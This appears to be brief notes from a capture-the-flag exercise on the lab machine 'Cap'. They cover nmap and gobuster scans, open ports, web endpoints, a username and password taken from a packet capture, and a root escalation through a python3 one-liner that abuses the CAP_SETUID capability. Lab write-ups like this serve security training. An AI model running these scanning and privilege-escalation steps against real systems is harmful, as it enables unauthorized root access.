# Cap

## Scanning 

`sudo nmap -sC -sV -oN nmap/initial 10.10.10.245`

```
gobuster dir -u 10.10.10.245 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```


### Open ports

```
21 vsftpd 3.0.3
22
80
```

## Users


* Got creds in 0.pcap

```
nathan
Buck3tH4TF0RM3!
```


## Endpoints

```
/data                 
/ip                                
/netstat                       
/capture
```


## Vuln

* it has python3 and we can execute and gain root priv (`python3_command.png`)

```
If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.
```

* just go to `home` and type `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`